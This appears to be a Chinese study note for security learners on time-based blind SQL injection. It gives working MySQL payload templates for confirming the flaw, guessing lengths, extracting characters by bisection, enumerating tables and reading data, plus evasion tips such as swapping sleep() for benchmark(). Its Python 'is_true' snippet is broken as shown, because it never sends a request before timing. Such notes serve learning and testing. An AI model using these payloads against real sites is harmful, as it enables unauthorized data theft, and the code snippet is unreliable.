# 06 · 时间盲注

> 日期：2026-09-20 | 标签：#Web安全 #SQL注入 #时间盲注

## 1. 什么是时间盲注

当页面**既没有回显、也没有报错、内容还完全一样**时，让数据库"睡一会儿"，
靠**响应时间的快慢**判断条件真假，再用**二分法**逐字符把数据推出来。

## 2. 四种注入对比（重要总结）

| 类型 | 数据从哪出来 | 前提 | 典型 payload |
|---|---|---|---|
| 联合注入 | 查询结果显示区 | 有回显位 | `union select 1,database()` |
| 报错注入 | 错误信息 | 页面显示报错 | `and updatexml(1,concat(0x7e,database()),1)` |
| 布尔盲注 | **页面内容差异** | 页面有真假区别 | `and ascii(substr(database(),1,1))>100` |
| **时间盲注** | **响应时间** | 页面完全没差异 | `and if(ascii(substr(database(),1,1))>100,sleep(2),0)` |

## 3. 原理

用两个函数组合：

- `sleep(n)`：让数据库暂停 n 秒
- `if(条件, A, B)`：条件为真返回 A，为假返回 B

```sql
if(ascii(substr(database(),1,1))>100, sleep(2), 0)
```

| 条件 | 执行 | 页面表现 |
|---|---|---|
| **真** | 执行 `sleep(2)` | **慢 2 秒** ⏱️ |
| **假** | 返回 `0` | **秒回** ⚡ |

**判断标准**：响应时间 > 阈值（比如 1.6 秒）= 条件为真。

## 4. 关键函数

| 函数 | 作用 |
|---|---|
| `sleep(n)` | 让数据库暂停 n 秒 |
| `if(条件, A, B)` | 条件为真返回 A，为假返回 B |
| `length(x)` | 求长度 |
| `substr(x, 位置, 长度)` | 截取字符（位置从 1 开始） |
| `ascii(x)` | 字符 → ASCII 码 |
| `chr(数字)` | ASCII 码 → 字符（Python 里用） |

## 5. Payload 模板

**整数型：**
```
1 and if(条件, sleep(2), 0)
```

**字符型：**
```
1' and if(条件, sleep(2), 0) #
```

**具体用法：**

```
# 验证是否存在时间盲注
1 and sleep(3)                              → 页面卡 3 秒

# 猜长度
1 and if(length(database())=4, sleep(2), 0)

# 猜字符（二分法）
1 and if(ascii(substr(database(),1,1))>100, sleep(2), 0)

# 猜表名（第 1 张表）
1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100, sleep(2), 0)

# 取数据
1 and if(ascii(substr((select flag from flag),1,1))>100, sleep(2), 0)
```

## 6. 完整流程

```
① 判断注入类型（1' 是否报错 → 字符型 / 整数型）
② 验证时间盲注（1 and sleep(3) 页面是否卡 3 秒）
③ 猜长度（length）
④ 二分法逐字符猜
⑤ 按顺序：库名 → 表名（limit 翻页）→ 字段名 → 数据
```

## 7. 脚本核心逻辑

### ① 判断真假

```python
def is_true(condition):
    payload = PAYLOAD.format(condition=f"if({condition},sleep({SLEEP_TIME}),0)")
    start = time.time()

    return time.time() - start > THRESHOLD   # 响应超过阈值 = 真
```

## 8. 优缺点与提速

| 优点 | 缺点 |
|---|---|
| 适用面最广（什么都看不到也能用） | **非常慢**（每个判断要等几秒） |
| 不需要回显、不需要报错 | 受网络波动影响，容易误判 |

**提速技巧：**
- `sleep` 时间缩短（1 秒，别低于 0.5）
- 用**二分法**（7 次 vs 96 次）
- 用 `requests.Session()` **复用连接**
- 直接写脚本跑

## 10. 踩坑记录

- Burp Intruder 社区版**限速**，跑大批量请求非常慢 → 改用 Python 脚本
- `sleep` 时间别超过 5 秒，否则服务器可能超时断连
- 网络有波动，判断阈值设为 `SLEEP_TIME * 0.8` 更稳

## 11. 面试要点

| 问题 | 回答 |
|---|---|
| 时间盲注怎么判断真假？ | 看**响应时间**，超过阈值（如 1.6 秒）说明条件为真 |
| 为什么用二分法？ | ASCII 范围 32~127，遍历要 96 次；二分法**7 次以内**定位一个字符 |
| 四种注入的区别？ | 数据出口不同：回显位 / 错误信息 / 页面内容差异 / 响应时间 |
| `sleep` 被过滤怎么办？ | 换 `benchmark()` 等重查询函数制造延迟 |
| 为什么用 `Session`？ | 复用 TCP 连接 + 自动管理 Cookie，几百次请求能省大量时间 |
